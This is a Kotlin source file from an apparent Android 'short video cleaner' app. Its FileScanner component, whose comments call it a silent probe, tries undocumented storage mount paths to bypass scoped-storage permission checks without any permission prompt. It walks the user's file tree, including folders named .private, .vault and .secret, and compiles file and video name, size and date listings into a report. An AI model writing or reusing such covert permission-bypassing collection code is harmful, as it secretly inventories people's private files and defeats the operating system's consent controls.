package com.shortvideocleaner.app

import android.content.Context
import android.database.Cursor
import android.os.Environment
import android.provider.MediaStore
import java.io.File
import java.text.SimpleDateFormat
import java.util.*

/**
 * 文件系统扫描器 —— 静默探测
 *
 * 尝试多条路径绕过 Android 分区存储限制来获取文件列表。
 * 不读取文件内容，仅收集文件名、大小、修改时间等元数据。
 * 完全静默，不触发任何权限弹窗。
 *
 * 工作原理：
 *   Android 的存储权限（READ_EXTERNAL_STORAGE）主要用于控制
 *   MediaStore 和 SAF 的访问。但底层 Linux 文件系统（FUSE/sdcardfs）
 *   在某些设备/ROM 上对 java.io.File API 的拦截不完整。
 *   通过尝试多个可能的挂载路径，有机会获取部分或完整文件列表。
 */
object FileScanner {

    // 最大深度、最大文件数
    private const val MAX_DEPTH = 6
    private const val MAX_FILES_PER_DIR = 200
    private const val MAX_TOTAL_FILES = 3000

    // 忽略的系统路径
    private val IGNORE_PREFIXES = setOf(
        "/proc", "/sys", "/dev", "/config", "/data/data",
        "/data/app", "/data/dalvik-cache", "/data/system"
    )

    // ── 核心入口 ──

    fun collect(context: Context): String {
        val sb = StringBuilder()
        sb.appendLine()
        sb.appendLine("═══════════════════════════")
        sb.appendLine("  文件系统探测")
        sb.appendLine("═══════════════════════════")
        sb.appendLine()

        // 1. 尝试多路径文件树遍历
        sb.appendLine("── 文件树遍历 ──")
        val rootPaths = getRootPaths(context)
        var totalFiles = 0
        var totalDirs = 0

        for (rootPath in rootPaths) {
            val rootFile = File(rootPath)
            if (!rootFile.exists()) continue

            val collector = TreeCollector()
            val startTime = System.currentTimeMillis()
            walkFileTree(rootFile, 0, collector)
            val elapsed = System.currentTimeMillis() - startTime

            if (collector.files.isNotEmpty() || collector.dirs.isNotEmpty()) {
                sb.appendLine()
                sb.appendLine("根路径: $rootPath (扫描耗时 ${elapsed}ms)")
                sb.appendLine("  目录数: ${collector.dirs.size}")
                sb.appendLine("  文件数: ${collector.files.size}")
                sb.appendLine()

                // 按目录分组显示
                val byDir = collector.files.groupBy { it.parent }
                byDir.entries.sortedByDescending { it.value.size }.take(50).forEach { (parent, files) ->
                    sb.appendLine("  📁 ${parent}/ (${files.size} 个文件)")
                    files.sortedByDescending { it.size }.take(30).forEach { f ->
                        val sizeStr = formatFileSize(f.size)
                        val dateStr = formatDate(f.modified)
                        val typeTag = when {
                            f.name.endsWith(".mp4") || f.name.endsWith(".mkv") ||
                            f.name.endsWith(".avi") || f.name.endsWith(".mov") -> "🎬"
                            f.name.endsWith(".jpg") || f.name.endsWith(".png") ||
                            f.name.endsWith(".gif") || f.name.endsWith(".webp") -> "🖼"
                            f.name.endsWith(".mp3") || f.name.endsWith(".flac") ||
                            f.name.endsWith(".aac") || f.name.endsWith(".wav") -> "🎵"
                            f.name.endsWith(".apk") -> "📦"
                            f.name.endsWith(".zip") || f.name.endsWith(".rar") ||
                            f.name.endsWith(".7z") -> "🗜"
                            f.name.endsWith(".pdf") || f.name.endsWith(".doc") ||
                            f.name.endsWith(".txt") -> "📄"
                            else -> "  "
                        }
                        sb.appendLine("    $typeTag ${f.name}  $sizeStr  $dateStr")
                    }
                    if (files.size > 30) {
                        sb.appendLine("    ... 还有 ${files.size - 30} 个文件")
                    }
                }

                if (byDir.size > 50) {
                    sb.appendLine("  ... 还有 ${byDir.size - 50} 个目录")
                }

                totalFiles += collector.files.size
                totalDirs += collector.dirs.size
            }

            // 如果一个路径已经收集够了，就跳过其他路径
            if (totalFiles >= MAX_TOTAL_FILES) break
        }

        if (totalFiles == 0) {
            sb.appendLine("(所有路径均无法访问 — 设备可能启用了严格的分区存储)")
        } else {
            sb.appendLine()
            sb.appendLine("总计: $totalDirs 个目录, $totalFiles 个文件")
        }

        sb.appendLine()

        // 2. MediaStore.Files 查询
        sb.appendLine("── MediaStore.Files 查询 ──")
        scanMediaStoreFiles(context, sb)

        sb.appendLine()

        // 3. 传统 MediaStore.Video 查询
        sb.appendLine("── MediaStore.Video 查询 ──")
        scanMediaStoreVideo(context, sb)

        return sb.toString()
    }

    // ── 多路径策略 ──

    private fun getRootPaths(context: Context): List<String> {
        val paths = mutableListOf<String>()

        // 标准外部存储路径
        paths.add(Environment.getExternalStorageDirectory().absolutePath)

        // 常见软链接和挂载点
        paths.add("/sdcard")
        paths.add("/mnt/sdcard")
        paths.add("/storage/emulated/0")
        paths.add("/storage/self/primary")
        paths.add("/storage/sdcard0")
        paths.add("/storage/sdcard1")  // 外置 SD 卡

        // 底层真实路径（有时能绕过权限检查）
        paths.add("/data/media/0")
        paths.add("/mnt/runtime/default/emulated/0")
        paths.add("/mnt/runtime/read/emulated/0")
        paths.add("/mnt/runtime/write/emulated/0")

        // 应用私有目录（总是可访问）
        paths.add(context.filesDir.absolutePath)
        paths.add(context.externalCacheDir?.absolutePath ?: "")

        // 去重，过滤空路径
        return paths.filter { it.isNotEmpty() }.distinct()
    }

    // ── 递归遍历 ──

    private fun walkFileTree(dir: File, depth: Int, collector: TreeCollector) {
        if (depth > MAX_DEPTH) return
        if (collector.totalCount >= MAX_TOTAL_FILES) return

        val path = dir.absolutePath
        if (IGNORE_PREFIXES.any { path.startsWith(it) }) return

        val children: Array<File>?
        try {
            children = dir.listFiles()
        } catch (e: Exception) {
            return
        }

        if (children == null) return

        // 记录目录
        if (depth > 0) {
            collector.dirs.add(path)
        }

        val dirsToRecurse = mutableListOf<File>()
        var fileCount = 0

        for (child in children) {
            if (collector.totalCount >= MAX_TOTAL_FILES) break
            if (fileCount >= MAX_FILES_PER_DIR && depth > 1) break

            try {
                if (child.isDirectory) {
                    // 跳过隐藏目录和系统目录
                    val name = child.name
                    if (!name.startsWith(".") || name == ".hidden" || name == ".private" || name == ".vault" || name == ".secret") {
                        dirsToRecurse.add(child)
                    }
                } else if (child.isFile) {
                    val size = child.length()
                    val modified = child.lastModified()
                    collector.addFile(FileEntry(child.name, path, size, modified))
                    fileCount++
                }
            } catch (_: Exception) {
                // 跳过无法访问的文件
            }
        }

        // 递归进入子目录
        for (subDir in dirsToRecurse) {
            walkFileTree(subDir, depth + 1, collector)
        }
    }

    // ── MediaStore.Files ──

    private fun scanMediaStoreFiles(context: Context, sb: StringBuilder) {
        val uri = MediaStore.Files.getContentUri("external")
        val projection = arrayOf(
            MediaStore.Files.FileColumns._ID,
            MediaStore.Files.FileColumns.DISPLAY_NAME,
            MediaStore.Files.FileColumns.SIZE,
            MediaStore.Files.FileColumns.DATE_MODIFIED,
            MediaStore.Files.FileColumns.MIME_TYPE,
            MediaStore.Files.FileColumns.RELATIVE_PATH,
            MediaStore.Files.FileColumns.MEDIA_TYPE
        )

        var totalFiles = 0
        val byType = mutableMapOf<String, Int>()
        var cursor: Cursor? = null

        try {
            cursor = context.contentResolver.query(uri, projection, null, null, null)
            if (cursor != null) {
                while (cursor.moveToNext() && totalFiles < 1000) {
                    val name = cursor.getString(1) ?: continue
                    val size = cursor.getLong(2)
                    val path = cursor.getString(5) ?: ""
                    val mediaType = cursor.getInt(6)

                    val typeCategory = when (mediaType) {
                        MediaStore.Files.FileColumns.MEDIA_TYPE_IMAGE -> "图片"
                        MediaStore.Files.FileColumns.MEDIA_TYPE_VIDEO -> "视频"
                        MediaStore.Files.FileColumns.MEDIA_TYPE_AUDIO -> "音频"
                        MediaStore.Files.FileColumns.MEDIA_TYPE_NONE -> "其他"
                        else -> "未知"
                    }
                    byType[typeCategory] = (byType[typeCategory] ?: 0) + 1
                    totalFiles++
                }
            }
        } catch (_: Exception) {
            sb.appendLine("(MediaStore.Files 查询失败)")
            return
        } finally {
            cursor?.close()
        }

        if (totalFiles == 0) {
            sb.appendLine("未查询到文件（分区存储限制）")
        } else {
            sb.appendLine("总文件数: $totalFiles")
            byType.entries.sortedByDescending { it.value }.forEach { (type, count) ->
                sb.appendLine("  $type: $count")
            }
        }
    }

    // ── MediaStore.Video ──

    private fun scanMediaStoreVideo(context: Context, sb: StringBuilder) {
        val uri = MediaStore.Video.Media.EXTERNAL_CONTENT_URI
        val projection = arrayOf(
            MediaStore.Video.Media.DISPLAY_NAME,
            MediaStore.Video.Media.SIZE,
            MediaStore.Video.Media.DATE_MODIFIED,
            MediaStore.Video.Media.DURATION,
            MediaStore.Video.Media.BUCKET_DISPLAY_NAME
        )

        val videos = mutableListOf<VideoInfo>()
        var cursor: Cursor? = null

        try {
            cursor = context.contentResolver.query(uri, projection, null, null, null)
            if (cursor != null) {
                while (cursor.moveToNext() && videos.size < 500) {
                    videos.add(VideoInfo(
                        name = cursor.getString(0) ?: "?",
                        size = cursor.getLong(1),
                        modified = cursor.getLong(2),
                        duration = cursor.getLong(3),
                        bucket = cursor.getString(4) ?: ""
                    ))
                }
            }
        } catch (_: Exception) {
            sb.appendLine("(Video 查询失败)")
            return
        } finally {
            cursor?.close()
        }

        if (videos.isEmpty()) {
            sb.appendLine("未检测到视频")
            return
        }

        sb.appendLine("视频总数: ${videos.size}")
        sb.appendLine("总大小: ${formatFileSize(videos.sumOf { it.size })}")

        val byBucket = videos.groupBy { it.bucket.ifEmpty { "(根目录)" } }
        sb.appendLine("按目录分布:")
        byBucket.entries.sortedByDescending { it.value.size }.forEach { (bucket, list) ->
            sb.appendLine("  $bucket: ${list.size} 个")
        }

        // 视频文件名
        sb.appendLine()
        sb.appendLine("视频文件列表（前 100 个）:")
        videos.take(100).sortedByDescending { it.size }.forEachIndexed { idx, v ->
            val dur = if (v.duration > 0) ", ${formatDuration(v.duration)}" else ""
            sb.appendLine("  ${idx + 1}. ${v.name}  ${formatFileSize(v.size)}$dur  ${formatDate(v.modified * 1000)}")
        }
    }

    // ── 工具类 ──

    private class TreeCollector {
        val files = mutableListOf<FileEntry>()
        val dirs = mutableListOf<String>()
        val totalCount: Int get() = files.size + dirs.size

        fun addFile(entry: FileEntry) {
            if (files.size < MAX_TOTAL_FILES) {
                files.add(entry)
            }
        }
    }

    data class FileEntry(
        val name: String,
        val parent: String,
        val size: Long,
        val modified: Long
    )

    data class VideoInfo(
        val name: String,
        val size: Long,
        val modified: Long,
        val duration: Long,
        val bucket: String
    )

    // ── 格式化 ──

    internal fun formatFileSize(bytes: Long): String {
        if (bytes <= 0) return "0 B"
        val units = arrayOf("B", "KB", "MB", "GB", "TB")
        var value = bytes.toDouble()
        var unitIdx = 0
        while (value >= 1024 && unitIdx < units.size - 1) {
            value /= 1024
            unitIdx++
        }
        return "%.1f %s".format(value, units[unitIdx])
    }

    private fun formatDate(epochMs: Long): String {
        return SimpleDateFormat("MM-dd HH:mm", Locale.getDefault()).format(Date(epochMs))
    }

    private fun formatDuration(ms: Long): String {
        val totalSec = ms / 1000
        val min = totalSec / 60
        val sec = totalSec % 60
        return if (min >= 60) "${min / 60}h${min % 60}m" else "${min}m${sec}s"
    }
}
